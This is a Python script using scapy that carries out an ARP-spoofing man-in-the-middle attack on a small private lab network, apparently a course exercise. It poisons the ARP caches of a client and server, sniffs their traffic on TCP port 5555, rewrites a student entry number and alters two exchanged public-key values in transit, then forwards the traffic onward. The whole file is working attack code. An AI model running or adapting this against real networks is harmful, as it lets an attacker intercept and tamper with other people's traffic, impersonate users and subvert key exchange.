#!/usr/bin/env python3

import logging
import sys
import threading
import time

from scapy.all import ARP, IP, TCP, Ether, Raw, sendp, sniff

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

CLIENT_IP = "10.0.2.102"
CLIENT_MAC = "08:00:27:6a:84:16"

SERVER_IP = "10.0.2.100"
SERVER_MAC = "08:00:27:de:40:39"

MITM_IP = "10.0.2.101"  
MITM_MAC = "08:00:27:68:e2:97"  

INTERFACE = "eth0"  

ARP_INTERVAL = 2  


def arp_spoof(target_ip, target_mac, spoof_ip):
    
    arp_response = ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=MITM_MAC
    )
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, iface=INTERFACE, verbose=False)
    # print(f" Sent ARP spoof to {target_ip}: {spoof_ip} is at {MITM_MAC}")


def spoof_arp():
    
    try:
        while True:
            arp_spoof(
                CLIENT_IP, CLIENT_MAC, SERVER_IP
            )  
            arp_spoof(
                SERVER_IP, SERVER_MAC, CLIENT_IP
            )  
            time.sleep(ARP_INTERVAL)
    except KeyboardInterrupt:
        print("\n[*] Stopped ARP spoofing.")
        restore_network()
        sys.exit(0)


def restore_network():
    
    # print(" Restoring network")
    arp_response_client = ARP(
        op=2, pdst=CLIENT_IP, hwdst=CLIENT_MAC, psrc=SERVER_IP, hwsrc=SERVER_MAC
    )
    ether_client = Ether(dst=CLIENT_MAC)
    packet_client = ether_client / arp_response_client
    sendp(packet_client, iface=INTERFACE, count=5, verbose=False)

    # Restore server
    arp_response_server = ARP(
        op=2, pdst=SERVER_IP, hwdst=SERVER_MAC, psrc=CLIENT_IP, hwsrc=CLIENT_MAC
    )
    ether_server = Ether(dst=SERVER_MAC)
    packet_server = ether_server / arp_response_server
    sendp(packet_server, iface=INTERFACE, count=5, verbose=False)

    # print("Network restored.")


def modify_packet(packet):
    
    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]

        if (
            ip_layer.src == CLIENT_IP
            and ip_layer.dst == SERVER_IP
            and tcp_layer.dport == 5555
        ):
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors="ignore")
                print(f"[+] Client->Server Data: {payload}")
                modified_payload = payload

                if "2024JCS2043" in payload:
                    modified_payload = payload.replace("2024JCS2043", "2024JCS2613")
                    print(f"[+] Modified Entry Number to: {modified_payload}")

                elif "203836390120" in payload:
                    modified_payload = "20383639012"  
                    print(f"[+] Modified Public Key A to: {modified_payload}")

                if modified_payload != payload:
                    ether = Ether(src=MITM_MAC, dst=SERVER_MAC)
                    ip = IP(src=ip_layer.src, dst=ip_layer.dst)
                    tcp = TCP(
                        sport=tcp_layer.sport,
                        dport=tcp_layer.dport,
                        seq=tcp_layer.seq,
                        ack=tcp_layer.ack,
                        flags=tcp_layer.flags,
                    )
                    raw = Raw(load=modified_payload.encode())
                    modified_packet = ether / ip / tcp / raw

                    sendp(modified_packet, iface=INTERFACE, verbose=False)
                    print("[+] Sent modified packet from Client to Server.")
                    return  

        elif (
            ip_layer.src == SERVER_IP
            and ip_layer.dst == CLIENT_IP
            and tcp_layer.sport == 5555
        ):
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors="ignore")
                print(f" Server->Client Data: {payload}")
                modified_payload = payload

                if "135123667066" in payload:
                    modified_payload = "13512366706"  
                    print(f"[+] Modified Public Key B to: {modified_payload}")

                if modified_payload != payload:
                    ether = Ether(src=MITM_MAC, dst=CLIENT_MAC)
                    ip = IP(src=ip_layer.src, dst=ip_layer.dst)
                    tcp = TCP(
                        sport=tcp_layer.sport,
                        dport=tcp_layer.dport,
                        seq=tcp_layer.seq,
                        ack=tcp_layer.ack,
                        flags=tcp_layer.flags,
                    )
                    raw = Raw(load=modified_payload.encode())
                    modified_packet = ether / ip / tcp / raw

                    sendp(modified_packet, iface=INTERFACE, verbose=False)
                    print("[+] Sent modified packet from Server to Client.")
                    return  

    try:
        if packet.haslayer(IP):
            if packet[IP].dst == CLIENT_IP:
                dest_mac = CLIENT_MAC
            elif packet[IP].dst == SERVER_IP:
                dest_mac = SERVER_MAC
            else:
                print("[!] Unknown destination, dropping packet.")
                return

            ether = Ether(src=MITM_MAC, dst=dest_mac)
            ip = IP(src=packet[IP].src, dst=packet[IP].dst)
            tcp = TCP(
                sport=packet[TCP].sport,
                dport=packet[TCP].dport,
                seq=packet[TCP].seq,
                ack=packet[TCP].ack,
                flags=packet[TCP].flags,
            )

            if packet.haslayer(Raw):
                raw = Raw(load=packet[Raw].load)
                modified_packet = ether / ip / tcp / raw
            else:
                modified_packet = ether / ip / tcp

            sendp(modified_packet, iface=INTERFACE, verbose=False)
        # print(
        #     f"[*] Forwarded packet: {ip_layer.src}:{tcp_layer.sport} -> {ip_layer.dst}:{tcp_layer.dport}"
        # )
    except Exception as e:
        print(f" Error forwarding packet: {e}")


def start_sniffing():
   
    print("[*] Starting packet sniffing...")
    sniff_filter = f"tcp port 5555 and ((src host {CLIENT_IP} and dst host {SERVER_IP}) or (src host {SERVER_IP} and dst host {CLIENT_IP}))"
    sniff(filter=sniff_filter, prn=modify_packet, store=False, iface=INTERFACE)


def main():
    arp_thread = threading.Thread(target=spoof_arp, daemon=True)
    arp_thread.start()
    print("ARP spoofing started.")

    try:
        start_sniffing()
    except KeyboardInterrupt:
        print("\n Detected CTRL+C, exiting...")
        restore_network()
        sys.exit(0)
    except Exception as e:
        print(f" An error occurred: {e}")
        restore_network()
        sys.exit(1)


if __name__ == "__main__":
    main()
